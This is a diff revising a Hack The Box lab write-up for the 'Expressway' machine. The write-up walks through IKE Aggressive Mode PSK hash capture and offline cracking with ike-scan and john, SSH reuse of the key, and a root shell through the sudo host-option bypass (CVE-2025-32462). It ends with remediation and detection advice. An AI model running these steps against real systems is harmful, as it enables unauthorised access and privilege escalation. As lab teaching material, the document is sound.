@@ -1,6 +1,6 @@
 ---
-title: "Expressway: IKE Aggressive Mode to Sudo Hostname Bypass"
-description: "IKE Aggressive Mode with PSK authentication exposes a crackable hash for SSH access, and a non-standard sudo binary is abused through a hostname-based policy bypass (CVE-2025-32463) to reach root."
+title: "Expressway — IKE Aggressive Mode to Sudo Hostname Bypass"
+description: "IKE Aggressive Mode with PSK authentication exposes a crackable hash for SSH access, and a non-standard sudo binary is abused through a hostname-based policy bypass (CVE-2025-32462) to reach root."
 type: case-study
 platform: Hack The Box
 content_type: machine
@@ -12,36 +12,58 @@ tags:
   - ike
   - privilege-escalation
   - credential-cracking
+objective: "Exploit an IKE VPN protocol weakness for initial access, then escalate to root through a non-standard sudo binary"
+tools:
+  - nmap
+  - ike-scan
+  - john
+skill: "IKE VPN protocol analysis and local privilege escalation"
+outcome: "Offline PSK recovery, authenticated SSH access, and root command execution via a sudo hostname policy bypass"
 ---
+
+## At a glance
+
+| Field | Value |
+|---|---|
+| Difficulty | Medium |
+| Target environment | Linux host exposing an IPsec/IKE VPN (UDP 500) and a Squid proxy |
+| Starting position | Unauthenticated network access |
+| Objective | Exploit an IKE VPN protocol weakness for initial access, then escalate to root through a non-standard sudo binary |
+| Outcome | Offline PSK recovery, authenticated SSH access, and root command execution via a sudo hostname policy bypass |
 
 ## Summary
 
-This Hack The Box Linux lab demonstrates exploitation of an IKE VPN service configured with PSK authentication and Aggressive Mode, yielding offline PSK hash cracking and SSH access. Post-access enumeration revealed a non-standard `sudo` binary vulnerable to a hostname-based policy bypass (CVE-2025-32463); an internal hostname from Squid proxy logs triggered a permissive sudoers rule, granting root. Target IPs, credentials, and flags are replaced with placeholders.
+Expressway is a Medium-rated Hack The Box Linux lab whose only meaningful initial attack surface is an IPsec/IKE VPN service configured with PSK authentication and Aggressive Mode. Enumerating the VPN yields the handshake material needed to capture the PSK hash, which is cracked offline and reused to authenticate over SSH. Post-access enumeration reveals a custom-compiled `sudo` binary and readable Squid proxy logs; a hostname exposed in those logs selects a permissive sudoers rule through the `sudo -h` host option and grants root.
+
+Target addresses, the VPN identity, the recovered secret, and result files are replaced with role-based placeholders; command syntax is preserved.
+
+**Attack path:** **IKE Aggressive Mode enumeration → PSK hash capture and offline cracking → SSH access → Squid log hostname discovery → `sudo -h` hostname policy bypass → root**
 
 ## Context and Objective
 
-The notes describe a Medium Linux machine with an IPsec/IKE VPN service as the primary attack surface. No web application was exposed. The objective was to identify VPN configuration weaknesses, obtain credentials through offline cracking, and escalate privileges on a system running a custom-compiled `sudo` binary.
+- **Target:** Linux host with an IPsec/IKE VPN service as the primary surface; no web application was exposed.
+- **Exposed services:** SSH (22) and IKE on UDP 500.
+- **Starting position:** unauthenticated network access, with no provided credentials.
+- **Objective:** identify VPN configuration weaknesses, recover credentials through offline cracking, and escalate privileges on a host running a custom-compiled `sudo` binary.
+- **Constraints:** activity was confined to the Hack The Box lab environment.
 
 ## Approach and Evidence
 
-### Discover the IKE service
+### 1. Discover the IKE service
 
-**Observation.** A UDP port scan identified the IKE service on UDP 500 as the primary attack surface. TCP scanning revealed only SSH.
-
-**Action.** The notes performed a UDP scan and then enumerated the IKE service:
+Observation: a TCP scan exposes only SSH, but a UDP scan reveals IKE on UDP 500 — the service that carries the primary attack surface, and one a TCP-only scan would miss entirely.
 
 ```bash
-sudo nmap -Pn -sU -sC -sV -oN nmap/<TARGET>-UDP <TARGET_IP>
+nmap -Pn -sC -sV -oN nmap/<OUT_PREFIX>-TCP <TARGET_IP>
+sudo nmap -Pn -sU -sC -sV -oN nmap/<OUT_PREFIX>-UDP <TARGET_IP>
 ```
 
 ```text
-PORT    STATE SERVICE VERSION
-500/udp open  isakmp  XAUTH, Dead Peer Detection
+# 22/tcp   open  ssh     OpenSSH 10.0p2
+# 500/udp  open  isakmp  XAUTH, Dead Peer Detection
 ```
 
-**Significance.** UDP scanning is critical when VPN services are present; TCP-only scans would have missed the primary attack vector entirely.
-
-**Supported result.** IKE enumeration with `ike-scan` confirmed Aggressive Mode was active:
+IKE enumeration with `ike-scan` confirms Aggressive Mode and PSK authentication:
 
 ```bash
 ike-scan -M <TARGET_IP>
@@ -53,13 +75,13 @@ ike-scan -M <TARGET_IP>
     ID(Type=ID_USER_FQDN, Value=ike@<TARGET_DOMAIN>)
 ```
 
-The `Auth=PSK` field confirms Pre-Shared Key authentication, and `Aggressive Mode` indicates the PSK hash is transmitted in recoverable form during the unencrypted handshake.
+Significance: `Auth=PSK` confirms pre-shared-key authentication, and the returned Aggressive Mode handshake exposes the peer identity (`ike@<TARGET_DOMAIN>`) required to capture the PSK hash.
 
-### Capture and crack the PSK hash
+Result: IKE Aggressive Mode is active with PSK authentication, giving both the attack surface and the identity string needed for hash capture.
 
-**Observation.** In IKE Aggressive Mode, the PSK hash is exposed in the initial handshake packets. The known peer identity string is required for hash capture.
+### 2. Capture and crack the PSK hash
 
-**Action.** The notes captured the hash using the peer identity and converted it for offline cracking:
+Observation: in Aggressive Mode the PSK hash is transmitted in the first unencrypted packets, so it can be captured for a known peer identity and attacked offline.
 
 ```bash
 ike-scan -A <TARGET_IP> \
@@ -70,48 +92,50 @@ ikescan2john hash.txt > ike.hash
 john ike.hash --wordlist=<WORDLIST_PATH>
 ```
 
-**Significance.** Aggressive Mode transmits the PSK hash before an encrypted channel is established, enabling offline dictionary attacks against weak pre-shared keys.
-
-**Supported result.** The recorded output shows the cracked PSK was found:
+Cracking recovers the pre-shared key:
 
 ```text
-<CRACKED_PSK>
+<VPN_PSK>
 ```
 
-### Establish SSH access
+Significance: because the hash is transmitted before an encrypted channel exists, a weak pre-shared key falls to an offline dictionary attack without any interaction with the VPN.
 
-**Observation.** The cracked PSK corresponded to SSH credentials for the `<VPN_USER>` account.
+Result: the pre-shared key is recovered; the same value is also the SSH password for the `<VPN_USER>` account.
 
-**Action.** The notes used the recovered credentials for SSH authentication:
+### 3. Establish SSH access
+
+Observation: the recovered pre-shared key is reused as the SSH password for the `<VPN_USER>` account.
 
 ```bash
 ssh <VPN_USER>@<TARGET_IP>
+# password: <VPN_PSK>
 ```
 
-**Significance.** VPN credential reuse with SSH is a common misconfiguration in environments where the same PSK is used for both authentication contexts.
+Significance: reusing the VPN pre-shared key as an interactive login credential turns an offline protocol weakness into direct host access. The account context is confirmed by the local enumeration in the next stage.
 
-**Supported result.** The notes report obtaining a shell as the `<VPN_USER>` account and reading the user result from `<USER_RESULT_FILE>`.
+Result: the credential is validated over SSH — the source records the login as successful — yielding a low-privileged session as `<VPN_USER>`.
 
-### Enumerate privilege escalation vectors
+### 4. Enumerate privilege-escalation vectors
 
-**Observation.** The `sudo` binary at `/usr/local/bin/sudo` was a non-standard, custom-compiled installation running version 1.9.17. The `<VPN_USER>` account was a member of the `proxy` group, granting read access to Squid proxy logs.
-
-**Action.** The notes performed local enumeration:
+Observation: the `sudo` binary lives at the non-standard path `/usr/local/bin/sudo` and reports version 1.9.17, while the account is a member of the `proxy` group.
 
 ```bash
 which sudo
-# /usr/local/bin/sudo  ← non-standard path
-
 sudo -V
-# Sudo version 1.9.17
-
 id
-# uid=<USER_ID>(<VPN_USER>) gid=<GROUP_ID>(<VPN_USER>) groups=<GROUP_ID>(<VPN_USER>),13(proxy)
+sudo -l
 ```
 
-**Significance.** Non-standard binary paths bypass package-manager update processes. Version 1.9.17 introduced hostname-based policy evaluation via the `-h` flag, which is exploitable when the sudoers configuration contains hostname-specific rules.
+```text
+/usr/local/bin/sudo
+Sudo version 1.9.17
+uid=1001(<VPN_USER>) gid=1001(<VPN_USER>) groups=1001(<VPN_USER>),13(proxy)
+Sorry, user <VPN_USER> may not run sudo on <TARGET_HOST>.
+```
 
-**Supported result.** Proxy log access revealed an internal hostname:
+Significance: a custom-compiled binary outside the package manager bypasses distribution patching, and version 1.9.17 is affected by the sudo host-option privilege-escalation flaw. The default policy denies the user, so the result depends on whether a permissive hostname-specific rule exists.
+
+The `proxy` group membership also grants read access to the Squid access log:
 
 ```bash
 cat /var/log/squid/access.log.1
@@ -121,13 +145,13 @@ cat /var/log/squid/access.log.1
 <TIMESTAMP>  <INTERNAL_IP>  TCP_DENIED/403  GET http://offramp.<TARGET_DOMAIN>
 ```
 
-The log entry shows an internal client attempting to access `offramp.<TARGET_DOMAIN>`, exposing a hostname that may have a corresponding sudoers policy.
+Significance: proxy logs disclose internal hostnames, and a name in these logs may correspond to a more permissive sudoers rule than the current host's.
 
-### Exploit CVE-2025-32463 — sudo hostname policy bypass
+Result: the enumeration identifies both an affected `sudo` version and the internal hostname `offramp.<TARGET_DOMAIN>` to test against it.
 
-**Observation.** Sudo 1.9.17 evaluates policies based on a hostname specified via `-h`. If the target hostname has a more permissive sudoers rule, the current user's restrictions are bypassed.
+### 5. Exploit the sudo host-option policy bypass (CVE-2025-32462)
 
-**Action.** The notes applied the bypass using the hostname discovered in proxy logs:
+Observation: the `sudo` host option (`-h`/`--host`), intended only to list privileges for another host, is not restricted to listing and can select the policy for the named host when running a command; a permissive rule for that hostname bypasses the current user's restrictions.
 
 ```bash
 /usr/local/bin/sudo -h offramp.<TARGET_DOMAIN> /usr/bin/bash
@@ -138,25 +162,34 @@ root@<TARGET_HOST>:/# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-**Significance.** The `-h` flag causes sudo to look up the named hostname's sudoers policy instead of the current machine's. A permissive rule defined for `offramp.<TARGET_DOMAIN>` granted unrestricted root access when that hostname was supplied.
+Significance: supplying the internal hostname causes `sudo` to evaluate the named host's sudoers policy instead of the current machine's, so a rule defined for `offramp.<TARGET_DOMAIN>` grants unrestricted root execution to a user the default policy denies.
 
-**Supported result.** The recorded output confirms root execution and the elevated result was obtained from `<ELEVATED_RESULT_FILE>`.
+Result: the `id` output confirms execution in the root context.
 
 ## Challenges and Decisions
 
-The primary challenge was identifying the VPN service through UDP scanning — standard TCP-only approaches would have missed it entirely. The privilege escalation required correlating proxy log data with a version-specific sudo vulnerability, demonstrating that network log access can directly inform privilege escalation paths.
+- The VPN was reachable only over UDP; a TCP-only enumeration would have missed the primary attack surface entirely.
+- No web application or credential was provided, so initial access depended on the offline protocol weakness rather than a direct authentication bypass.
+- The privilege escalation required correlating a hostname observed in proxy logs with the `sudo` binary's version and host-option behavior; the default `sudo` policy denied the user, so the path only existed through a hostname-specific rule.
 
 ## Outcome
 
-Recorded evidence establishes offline PSK hash capture through IKE Aggressive Mode, credential recovery via dictionary cracking, SSH access, and root privilege escalation through CVE-2025-32463 hostname policy bypass. The attack chain spans network-layer protocol weakness to local binary vulnerability, with proxy log intelligence bridging the two.
+Root-level command execution was obtained on the target from an unauthenticated start, without a web application in the path. Remediation was not tested in the lab.
 
 ## Lessons and Recommendations
 
-- Disable IKE Aggressive Mode on all VPN gateways. Use Main Mode with certificate-based authentication to eliminate PSK hash exposure. If PSK is required, use a minimum of 32 random characters.
-- Keep security-critical binaries at distribution-provided versions. Custom-compiled `sudo` at `/usr/local/bin/sudo` bypasses package-manager patching. The non-standard path itself is a detection indicator.
-- Restrict proxy log access. Logs may reveal internal hostnames and network topology. Proxy access should be limited to the service account and designated security personnel.
-- Recommendations derive from the recorded access path; notes do not document remediation testing.
+The actions below are recommendations; none was validated in the lab.
+
+1. **IKE Aggressive Mode with PSK authentication.** Aggressive Mode transmits the PSK hash before an encrypted channel exists, enabling offline cracking, and the recovered key also authenticated SSH. *Recommendation:* disable Aggressive Mode and require Main Mode with certificate-based authentication; where PSK is unavoidable, use a long random key rather than a dictionary word. *Validation:* review VPN gateway IKE policy for the negotiated mode and authentication method.
+2. **Non-standard, unpatched `sudo`.** A custom-compiled `sudo` at `/usr/local/bin/sudo` ran version 1.9.17, outside distribution patch management, and the host option selected a permissive rule for another hostname. *Recommendation:* run the distribution-provided `sudo`, keep security-critical binaries under patch management, and treat a non-standard path as a detection indicator. *Detection:* alert on `sudo`/`sudoedit` invocations that pass `-h`/`--host` while running a command, and on execution of `sudo` from unexpected paths.
+3. **Over-broad proxy log access.** Membership in the `proxy` group exposed Squid access logs and the internal hostname that fed the sudo bypass. *Recommendation:* restrict proxy logs to the proxy service account and designated security personnel. *Detection:* monitor reads of proxy access logs by non-service accounts.
 
 ## References
 
-- Hack The Box [Expressway](https://app.hackthebox.com/machines/Expressway) machine, based on independently curated lab notes.
+- [Hack The Box — Expressway](https://app.hackthebox.com/machines/Expressway) (Linux lab machine)
+- [NVD — CVE-2025-32462](https://nvd.nist.gov/vuln/detail/CVE-2025-32462)
+- [Sudo — Local Privilege Escalation via the host option](https://www.sudo.ws/security/advisories/host_any/) (vendor advisory for CVE-2025-32462)
+- [RFC 2409 — The Internet Key Exchange (IKE)](https://www.rfc-editor.org/rfc/rfc2409) (Aggressive Mode handshake)
+- [Nmap Reference Guide](https://nmap.org/book/man.html)
+- [ike-scan](https://github.com/royhills/ike-scan) (IKE discovery and PSK hash capture)
+- [John the Ripper](https://github.com/openwall/john) (`ikescan2john` hash conversion and offline cracking)
